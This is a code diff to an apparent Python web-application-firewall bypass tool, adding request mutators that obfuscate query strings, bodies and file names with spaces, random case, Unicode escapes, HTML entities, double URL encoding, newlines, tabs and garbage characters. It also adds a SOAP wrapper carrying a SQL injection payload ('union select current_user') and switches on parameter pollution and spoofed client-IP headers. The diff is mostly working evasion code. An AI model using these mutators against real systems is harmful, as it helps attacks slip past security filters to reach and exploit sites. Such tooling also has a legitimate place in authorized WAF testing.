@@ -99,6 +99,140 @@ def insert_comments(text):
             parts[i] = '/*' + parts[i] + '*/'
     return ''.join(parts)
 
+def insert_spaces(text):
+    """Insert random comments or spaces in the text to break up keywords."""
+    parts = list(text)
+    for i in range(1, len(parts) - 1):
+        if random.choice([True, False]):
+            parts[i] = ' ' + parts[i]
+    return ''.join(parts)
+
+def unicode_normalize(payload):
+    """
+    使用 Unicode 字符对输入的 payload 进行编码,以尝试绕过安全限制。
+    
+    参数:
+    payload (str): 需要进行 Unicode 编码的原始 payload
+    
+    返回:
+    str: 编码后的 payload
+    """
+    normalized_payload = ""
+    for char in payload:
+        # 检查字符是否为 ASCII 字符
+        if char.isascii():
+            # 如果是 ASCII 字符,则使用 Unicode 编码进行替换
+            if random.choice([False,False,True, False,False]):
+                normalized_payload += f"\\u{ord(char):04X}"
+            else:
+                normalized_payload += char
+        else:
+            normalized_payload += char
+    return normalized_payload
+
+def html_entity_bypass(payload):
+    """
+    使用 HTML 实体编码对输入的 payload 进行编码,以尝试绕过安全限制。
+    
+    参数:
+    payload (str): 需要进行 HTML 实体编码的原始 payload
+    
+    返回:
+    str: 编码后的 payload
+    """
+    html_entities = {
+        '"': '&#34;',
+        "'": '&#39;',
+        '<': '&#60;',
+        '>': '&#62;',
+        '&': '&#38;'
+    }
+    
+    encoded_payload = ""
+    for char in payload:
+        encoded_payload += html_entities.get(char, char)
+    return encoded_payload
+
+def double_encode(payload):
+    """
+    使用双重编码对输入的 payload 进行编码,以尝试绕过安全过滤器。
+    
+    参数:
+    payload (str): 需要进行双重编码的原始 payload
+    
+    返回:
+    str: 双重编码后的 payload
+    """
+    first_encoded = urllib.parse.quote(payload)
+    second_encoded = urllib.parse.quote(first_encoded)
+    return second_encoded
+
+def newline_bypass(payload):
+    """
+    在输入的 payload 中插入换行符,以尝试绕过基于正则表达式的安全过滤器。
+    
+    参数:
+    payload (str): 需要进行换行符插入的原始 payload
+    
+    返回:
+    str: 插入换行符后的 payload
+    """
+    newline_chars = ["","\r","", "\n","", "\r\n",""]
+    
+    # 在 payload 中随机插入换行符
+    obfuscated_payload = ""
+    for char in payload:
+        obfuscated_payload += char
+        if char.isalnum() and random.choice([False,False,True]):
+            obfuscated_payload += newline_chars[random.randint(0, len(newline_chars) - 1)]
+    
+    return obfuscated_payload
+
+def tab_bypass(payload):
+    """
+    在输入的 payload 中插入换行符,以尝试绕过基于正则表达式的安全过滤器。
+    
+    参数:
+    payload (str): 需要进行换行符插入的原始 payload
+    
+    返回:
+    str: 插入换行符后的 payload
+    """
+    newline_chars = ["","\t","", "\n","", "\t\n",""]
+    
+    # 在 payload 中随机插入换行符
+    obfuscated_payload = ""
+    for char in payload:
+        obfuscated_payload += char
+        if char.isalnum() and random.choice([False,False,True]):
+            obfuscated_payload += newline_chars[random.randint(0, len(newline_chars) - 1)]
+    
+    return obfuscated_payload
+
+def garbage_character_bypass(payload):
+    """
+    在输入的 payload 中添加随机垃圾字符,以尝试绕过基于正则表达式的安全过滤器。
+    
+    参数:
+    payload (str): 需要添加垃圾字符的原始 payload
+    
+    返回:
+    str: 添加垃圾字符后的 payload
+    """
+    # 定义一些常见的垃圾字符
+    garbage_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*~+-_.,:;?@[/|\\]^`="
+    
+    # 在 payload 中随机插入垃圾字符
+    obfuscated_payload = ""
+    for char in payload:
+        obfuscated_payload += char
+        if char.isalnum() and random.choice([False,False,True]):
+            num_garbage = random.randint(1, 10)
+            obfuscated_payload += "".join(random.choices(garbage_chars, k=num_garbage))
+    return obfuscated_payload
+
+
+
 def mutant_methods_case_and_comment_obfuscation(headers, url, method, data, files):
     logger.info(TAG + "==>mutant_methods_case_and_comment_obfuscation")
     logger.debug(TAG + "==>headers: " + str(headers))
@@ -131,6 +265,280 @@ def mutant_methods_case_and_comment_obfuscation(headers, url, method, data, file
     })
 
     return mutant_payloads
+
+def mutant_methods_space_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_space_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    # obfuscated_path = random_case(insert_spaces(parsed_url.path))
+    obfuscated_path=parsed_url.path
+    obfuscated_query = insert_spaces(parsed_url.query)
+
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+    # print(mutated_url)
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = insert_spaces(data)
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (insert_spaces(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+
+def mutant_methods_upper_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_upper_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = random_case(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = random_case(data)
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (random_case(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+
+def mutant_methods_unicode_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_unicode_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = unicode_normalize(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = unicode_normalize(data)
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (unicode_normalize(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+def mutant_methods_html_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_html_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = html_entity_bypass(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = html_entity_bypass(data)
+
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (html_entity_bypass(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+
+def mutant_methods_double_decode_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_double_decode_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = double_encode(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = double_encode(data)
+
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (html_entity_bypass(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+def mutant_methods_newline_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_newline_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = newline_bypass(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+    # print(obfuscated_query)
+    # input()
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = newline_bypass(data)
+    # print(mutated_data)
+    # input()
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (newline_bypass(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+
+def mutant_methods_tab_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_tab_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = tab_bypass(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = tab_bypass(data)
+
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (tab_bypass(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
+
+def mutant_methods_garbage_character_obfuscation(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_garbage_character_obfuscation")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+
+    # Apply random case and comment obfuscation to the URL
+    parsed_url = urllib.parse.urlparse(url)
+    obfuscated_path = parsed_url.path
+    obfuscated_query = garbage_character_bypass(parsed_url.query)
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
+
+
+    # Apply the same to data if it's a string
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = garbage_character_bypass(data)
+
+
+    # Apply the same to file names if present
+    mutated_files = files
+    if files:
+        mutated_files = {name: (garbage_character_bypass(filename), file) for name, (filename, file) in files.items()}
+
+    # Create the mutated payload
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': mutated_files
+    })
+    return mutant_payloads
+
 
 def url_encode_payload(payload):
     """Helper function to URL encode a given payload."""
@@ -326,6 +734,41 @@ def mutant_methods_for_test_use(headers, url, method, data, files):
     logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
     return mutant_payloads
 
+def mutant_methods_transform_SOAP(headers, url, method, data, files):
+    logger.info(TAG + "==>mutant_methods_transform_SOAP")
+    # logger.debug(TAG + "==>headers: " + str(headers))
+    # 构造SOAP请求的XML格式
+
+    soap_request =[f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:header>
+            <soapenv:body>
+                <string>'{data}#</string>
+            </soapenv:body>
+        </soapenv:header>
+    </soapenv:envelope>""",f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:header>
+            <soapenv:body>
+                <string>'union select current_user, 2#</string>
+            </soapenv:body>
+        </soapenv:header>
+    </soapenv:envelope>"""] 
+
+    modified_headers = copy.deepcopy(headers)
+    # print(modified_headers['Content-Type'])
+    modified_headers["Content-Type"] = "application/octet-stream,text/xml"
+
+    mutant_payloads = []
+
+    mutant_payloads.append({
+        'headers': modified_headers,
+        'url': url,
+        'method': method,
+        'data': random.choice(soap_request),
+        'files': files
+    })
+    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
+    return mutant_payloads
+
 def mutant_methods_change_extensions(headers, url, method, data, files):
     """
     生成不同的 Content-Type 和字符集变体
@@ -390,7 +833,7 @@ def mutant_methods_change_charset(headers, url, method, data, files):
     # content_type=random.choice(content_type_variations)
     # input()
     # 修改请求头中的 Content-Type
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     # print(modified_headers['Content-Type'])
     modified_headers['Content-Type'] = content_type
     # print(content_type)
@@ -435,7 +878,7 @@ def mutant_methods_add_accept_charset(headers, url, method, data, files):
     weights = [0.66] + [0.03] * 8
     content_type= random.choices(charset_variations,weights=weights)[0]
     # 修改请求头中的 Content-Type
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     # print(modified_headers['Content-Type'])
     modified_headers['Accept-Charset'] = content_type
     # print(headers)
@@ -485,7 +928,7 @@ def mutant_methods_fake_IP(headers, url, method, data, files):
     ]
     
     # 复制原始headers,避免修改原始对象
-    modified_headers = headers.copy()
+    modified_headers = copy.deepcopy(headers)
     
     # 随机选择要添加的头部数量(1-3个)
     num_headers_to_add = random.randint(1, 3)
@@ -517,35 +960,36 @@ def mutant_methods_fake_IP(headers, url, method, data, files):
 
 
 
-def mutant_methods_peremeter_pollution_case1(headers, url, method, data, files):
+def mutant_methods_perameter_pollution_case1(headers, url, method, data, files):
     '''
     服务器使用最后收到的参数, WAF 只检查第一个参数。
     '''
     
-    logger.info(TAG + "==>mutant_methods_peremeter_pollution_case1")
+    logger.info(TAG + "==>mutant_methods_perameter_pollution_case1")
     # logger.debug(TAG + "==>headers: " + str(headers))
 
     mutant_payloads = []
 
 
     if data:
-
+        # print(data)
+        # input()
         plt_data=""
         if type(data)==str:
             if "=" in data:
                 no_poc=random.choice(["ls","1","1.jpg"])
-                pere=data.split("=")[0]
+                pera=data.split("=")[0]
                 poc=data.split("=")[1]
                 for _ in range(3):
-                    plt_data+=pere+"="+no_poc+"\n"
-                plt_data+=pere+"="+poc  
+                    plt_data+=pera+"="+no_poc+"\n"
+                plt_data+=pera+"="+poc  
             if ":" in data:
                 no_poc=random.choice(["\"ls\"}","\"1\"}","\"1.jpg\"}"])
-                pere=data.split(":")[0]
+                pera=data.split(":")[0]
                 poc=data.split(":")[1]
                 for _ in range(3):
-                    plt_data+=pere+":"+no_poc+"\n"
-                plt_data+=pere+":"+poc 
+                    plt_data+=pera+":"+no_poc+"\n"
+                plt_data+=pera+":"+poc 
         else:
             plt_data=data
         
@@ -590,10 +1034,10 @@ def mutant_methods_peremeter_pollution_case1(headers, url, method, data, files):
             })
 
     logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
-    print(mutant_payloads)
+    # print(mutant_payloads)
     # input("")
     return mutant_payloads
-def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
+def mutant_methods_perameter_pollution_case2(headers, url, method, data, files):
     '''
     服务器将来自相似参数的值合并,WAF 会单独检查它们。
     '''
@@ -606,7 +1050,7 @@ def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
         
         if type(data)==str:
             if "=" in data:
-                pere=data.split("=")[0]
+                pera=data.split("=")[0]
                 poc=data.split("=")[1]
                 point1 = random.randint(1, len(poc) - 2)
                 point2 = random.randint(point1 + 1, len(poc) - 1)
@@ -615,10 +1059,10 @@ def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
                 part.append(poc[point1:point2])
                 part.append(poc[point2:])
                 for i in range(3):
-                    plt_data+=pere+"="+part[i]+"\n"
+                    plt_data+=pera+"="+part[i]+"\n"
             if ":" in data:
 
-                pere=data.split(":")[0]
+                pera=data.split(":")[0]
                 poc=data.split(":")[1]
                 point1 = random.randint(1, len(poc) - 2)
                 point2 = random.randint(point1 + 1, len(poc) - 1)
@@ -627,14 +1071,14 @@ def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
                 part.append(poc[point1:point2])
                 part.append(poc[point2:])
                 for i in range(3):
-                    plt_data+=pere+":"+part[i]+"\n"
-            print(plt_data)
+                    plt_data+=pera+":"+part[i]+"\n"
+            # print(plt_data)
 
         else:
             plt_data=data
-            # pere=data.keys()
-            # for pere in list(data.keys()):
-            #     poc=data[pere]
+            # pera=data.keys()
+            # for pera in list(data.keys()):
+            #     poc=data[pera]
 
     
         mutant_payloads.append({
@@ -677,7 +1121,7 @@ def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
             })
 
     logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
-    print(mutant_payloads)
+    # print(mutant_payloads)
     # input("")
     return mutant_payloads
 
@@ -1065,12 +1509,21 @@ mutant_methods_chunked_transfer_encoding
 mutant_methods_multipart_form_data
 mutant_methods_sql_comment_obfuscation
 mutant_methods_convert_get_to_post
-mutant_methods_peremeter_pollution_case1
-mutant_methods_peremeter_pollution_case2
+mutant_methods_perameter_pollution_case1
+mutant_methods_perameter_pollution_case2
 mutant_methods_fake_IP
 mutant_methods_change_charset
 mutant_methods_add_accept_charset
 mutant_methods_change_extensions
+mutant_methods_transform_SOAP
+mutant_methods_space_obfuscation
+mutant_methods_upper_obfuscation
+mutant_methods_unicode_obfuscation
+mutant_methods_html_obfuscation
+mutant_methods_double_decode_obfuscation
+mutant_methods_newline_obfuscation
+mutant_methods_tab_obfuscation
+mutant_methods_garbage_character_obfuscation
 '''
 # 为变异方法添加开关
 mutant_methods_config = {
@@ -1092,12 +1545,22 @@ mutant_methods_config = {
     "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
     "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
     "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
-    # "mutant_methods_peremeter_pollution_case1": (mutant_methods_peremeter_pollution_case1, True),
-    # "mutant_methods_peremeter_pollution_case2": (mutant_methods_peremeter_pollution_case2, True),
-    # "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
-    # "mutant_methods_change_charset": (mutant_methods_change_charset, True),
-    # "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
-    # "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
+    "mutant_methods_perameter_pollution_case1": (mutant_methods_perameter_pollution_case1, True),
+    "mutant_methods_perameter_pollution_case2": (mutant_methods_perameter_pollution_case2, True),
+    "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
+    "mutant_methods_change_charset": (mutant_methods_change_charset, True),
+    "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
+    "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
+    "mutant_methods_transform_SOAP": (mutant_methods_transform_SOAP, False),
+    "mutant_methods_space_obfuscation": (mutant_methods_space_obfuscation, True),
+    "mutant_methods_upper_obfuscation": (mutant_methods_upper_obfuscation, True),
+    "mutant_methods_unicode_obfuscation": (mutant_methods_unicode_obfuscation, True),
+    "mutant_methods_html_obfuscation": (mutant_methods_html_obfuscation, True),
+    "mutant_methods_double_decode_obfuscation": (mutant_methods_double_decode_obfuscation, True),
+    "mutant_methods_newline_obfuscation": (mutant_methods_newline_obfuscation, True),
+    "mutant_methods_tab_obfuscation": (mutant_methods_tab_obfuscation, True),
+    "mutant_methods_garbage_character_obfuscation": (mutant_methods_garbage_character_obfuscation, True),
+    
 }
 # 为变异方法添加开关
 mutant_methods_config_for_rl = {
